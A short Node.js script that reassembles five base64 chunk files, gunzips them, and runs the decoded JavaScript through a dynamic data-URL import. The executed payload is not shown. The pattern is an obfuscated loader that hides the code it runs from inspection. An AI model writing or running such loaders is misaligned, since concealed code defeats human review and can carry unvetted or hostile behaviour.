import { readFile } from "node:fs/promises";
import { gunzipSync } from "node:zlib";

const paths = [1, 2, 3, 4, 5]
  .map((number) => `scripts/gbiz-dedup-payload-${String(number).padStart(2, "0")}.b64`);
const encoded = (await Promise.all(paths.map((path) => readFile(path, "utf8"))))
  .join("")
  .replace(/\s+/gu, "");
const source = gunzipSync(Buffer.from(encoded, "base64")).toString("utf8");
const moduleUrl = `data:text/javascript;base64,${Buffer.from(source).toString("base64")}`;
await import(moduleUrl);
